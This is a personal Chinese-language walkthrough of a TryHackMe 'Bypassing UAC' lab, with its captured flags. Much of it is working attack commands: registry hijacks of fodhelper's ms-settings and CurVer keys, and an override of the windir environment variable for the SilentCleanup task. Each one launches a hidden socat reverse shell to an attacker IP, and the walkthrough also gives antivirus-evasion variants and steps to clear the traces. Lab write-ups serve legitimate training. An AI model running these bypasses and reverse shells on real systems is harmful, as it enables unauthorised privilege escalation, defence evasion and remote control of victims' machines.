# Bypassing UAC




```
xfreerdp /v:10.10.195.227 /u:attacker /p:Password321

```



## UAC：基於 GUI 的繞過

**流程**
```
msconfig -> tool 啟動 cmd
```

**只有高權限可以看到flag**
```
C:\flags\GetFlag-msconfig.exe

//THM{UAC_HELLO_WORLD}
```




**流程**
```
azman.msc - >  help -> help topic -> 右鍵(查看原始程式碼) -> 記事本 -> file open -> C:\Windows\System32\cmd.exe


C:\flags\GetFlag-azman.exe
//THM{GUI_UAC_BYPASSED_AGAIN}
```




## UAC：自動提升進程


**某些可執行檔可以自動提升，無需任何使用者乾預即可實現高 IL。這適用於控制台的大部分功能和 Windows 提供的一些可執行檔。**


* 對於應用程序，需要滿足一些要求才能自動提升：
1. 可執行檔必須由 Windows 發布者簽署
2. 可執行檔必須包含在受信任的目錄中，例如`%SystemRoot%/System32/`或者`%ProgramFiles%/`


根據申請類型，可能適用其他要求：

可執行檔 (.exe) 必須在其清單中聲明autoElevate元素。
要檢查文件的清單，我們可以使用sigcheck，這是 Sysinternals 套件中提供的工具。
您可以在您的電腦上找到 sigcheck 的副本`C:\tools\` 。
如果我們檢查 msconfig.exe 的清單，我們將找到 autoElevate 屬性：



```
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```


* Windows 隨附的大多數 .msc 檔案都會自動提升
* Windows 會保留一個附加的可執行檔列表，即使清單中未要求，也會自動提升。例如，此清單包括 pkgmgr.exe 和 spinstall.exe。
* COM 物件也可以透過設定一些登錄項目來要求自動提升




### Fodhelper
```
Fodhelper.exe 是 Windows 預設可執行檔之一，負責管理 Windows 選用功能
但與 msconfig 不同，fodhelper 可以在無法存取 GUI 的情況下被濫用。


當 Windows 開啟檔案時，它會檢查註冊表以了解要使用的應用程式。
註冊表為每個文件類型保存一個稱為程式 ID ( ProgID ) 的金鑰，其中關聯了相應的應用程式



假設您嘗試開啟一個 HTML 檔案。將檢查稱為HKEY_CLASSES_ROOT的登錄部分，
以便系統知道它必須使用您首選的 Web 用戶端來開啟它



要使用的命令將在下面指定`shell/open/command`每個檔案的 ProgID 的子項目 
"C:\Program Files\Internet Explorer\iexplore.exe" %1
```



* 檢查 HKEY_CLASSES_ROOT 時，如果HKEY_CURRENT_USER (HKCU)處存在特定於使用者的關聯，則它將優先。如果未配置使用者特定關聯，則將使用 HKEY_LOCAL_MACHINE (HKLM)中的系統範圍關聯。這樣，每個用戶都可以根據需要單獨選擇自己喜歡的應用程式。





**實際上，HKEY_CLASSES_ROOT 只是註冊表上兩個不同路徑的合併視圖：**

1. HKEY_LOCAL_MACHINE\Software\Classes
2. HKEY_CURRENT_USER\Software\Classes



```
Computer\HKEY_CLASSES_ROOT\ms-settings\Shell\Open\Command

DelegateExecute   {4ed3a719-cea8-4bd9-910d-e252f997afc2}
```




**新增HKCU 才不會使用 HKLM**

**这一行设置一个名为 REG_KEY 的变量**
```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
```



**这一行设置一个名为 CMD 的变量，其值为包含 PowerShell 命令的字符串。该命令使用 socat.exe 工具将连接传递到指定的 IP 地址和端口，并执行 cmd.exe。**
```
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.18.1.192:4444 EXEC:cmd.exe,pipes"
```



**这一行向之前设置的注册表键添加一个名为 "DelegateExecute" 的值，其值为空字符串**
```
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
```

* 請注意我們如何需要建立一個名為DelegateExecute的空值才能使類別關聯生效。如果此註冊表值不存在，作業系統將忽略該命令並使用系統範圍的類別關聯。



**这一行将之前设置的 CMD 变量的值添加到注册表键中。**
```
reg add %REG_KEY% /d %CMD% /f
```




**執行fodhelper.exe 拿取 flag**
```

nc -lvp 4444


C:\flags\GetFlag-fodhelper.exe
//THM{AUTOELEVATE4THEWIN}



whoami /groups | find "Label"
//Mandatory Label\High Mandatory Level                          Label            S-1-16-12288       
```



**清除我們的足跡**
```
reg delete HKCU\Software\Classes\ms-settings\ /f
```



## UAC：改進 Fodhelper 漏洞以繞過 Windows Defender

### 請記住此方法不可靠
**連接預設後門**
```
nc 10.10.195.227 9999
```


作者說會察看到值，我是沒找到。但被偵測了。
```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.18.1.192:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY 
```


作者說拚時差，防毒還來不及刪除，就執行了，成功但被偵測了。
```
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.18.1.192:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

reg HKCU\Software\Classes\ms-settings\Shell\Open\command
//空 被刪了
```


### 改進 fodhelper 漏洞利用



當在同一系統上執行不同版本的應用程式的多個實例時，將使用 CurVer  progID 註冊表項下的條目

CurVer 可讓您指向 Windows 在開啟給定檔案類型時所使用的應用程式的預設版本。

我們將在註冊表中為我們選擇的新 progID 建立一個條目（任何名稱都可以），

然後將 ms-settings progID 中的 CurVer 條目指向我們新建立的 progID。這樣，

當 fodhelper 嘗試使用 ms-settings progID 開啟檔案時，它會注意到指向我們新 progID 的 CurVer 條目
並檢查它以查看要使用的命令。




```


$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.18.1.192:4445 EXEC:cmd.exe,pipes"

此行设置了一个名为 $program 的变量，其中包含运行 PowerShell 的命令，使用 socat.exe 建立到指定 IP 地址和端口的连接，然后执行 cmd.exe 并使用 pipes。


New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

这一部分创建了一个新的文件扩展关联，将 ".pwn" 扩展与指定的命令关联起来。这涉及到在注册表中创建一个新的项，并为其设置 "(default)" 值。

    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

这一部分在 HKCU:\Software\Classes\ms-settings\ 下创建了一个名为 "CurVer" 的项，并将其 "(default)" 值设置为 ".pwn"。

    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
最后，这一行启动了 "fodhelper.exe" 程序，并使用隐藏窗口样式。


```

當fodhelper嘗試開啟ms-settings程式時，

找到CurVer 可讓您指向 Windows 在開啟給定檔案類型時所使用的應用程式的預設版本

它將被指向.pwn progID並使用其關聯的命令。

這種技術更有可能逃避 Windows Defender，因為我們可以更自由地將有效負載放在何處，因為保存有效負載的 progID 的名稱完全是任意的。

攻擊者的機器上啟動一個新的反向 shell：
```
nc -lvp 4445
```


* 儘管我們仍然會被檢測到，但必須注意的是，有時防毒軟體使用的檢測方法是嚴格針對已發布的漏洞實施的，而不考慮可能的變化。




**如果我們將 Powershell 的漏洞利用轉換為使用 cmd.exe，則 AV 不會發出任何警報 （請務必在需要時替換您的 IP 位址）：**
```
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.18.1.192:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe

```



**拿到High Mandatory Level shell 沒彈出警告。**
```
whoami /groups | find "Label"

//Mandatory Label\High Mandatory Level                          Label            S-1-16-12288   



C:\flags\GetFlag-fodhelper-curver.exe
//THM{AV_UAC_BYPASS_4_ALL}


```




## UAC：環境變數擴展


**Task Scheduler **


**Microsoft -> windows -> DiskCleanup**

### 在這裡我們可以看到該任務選項。


* General
\Microsoft\Windows\DiskCleanup

* when running the tasl use the following user account:
run only when user is looged on 



* run with highest privileges
以最高權限運行」選項將使用呼叫使用者可用的最高權限安全性令牌，這對於管理員來說是一個高 IL 令牌


* actions 選項卡查看
```
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```


* settings 
此任務可以按需運行
```
Allow task to be run on demand 
```



**幸運的是，我們可以`%windir%`透過在註冊表中建立一個條目來覆寫該變數`HKCU\Environment`**



**「REM」之後的任何內容都將被忽略作為註釋。**
```
cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```


**執行**
```
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.18.1.192:4446 EXEC:cmd.exe,pipes &REM " /f



schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```


**拿shell**
```
nc -lvp 4446


whoami /groups | find "Label"
//Mandatory Label\High Mandatory Level                          Label            S-1-16-12288    

C:\flags\GetFlag-diskcleanup.exe
//THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}

```




## 自動繞過UAC

UACME 由 @hfiref0x 創建，提供了可以開箱即用的 UAC 繞過技術的最新儲存庫。該工具可從其官方存儲庫下載：
https://github.com/hfiref0x/UACME

```
C:\tools>UACME-Akagi64.exe 34



彈出新的CMD
whoami /groups | find "Label"
//Mandatory Label\High Mandatory Level                          Label            S-1-16-12288  
```










































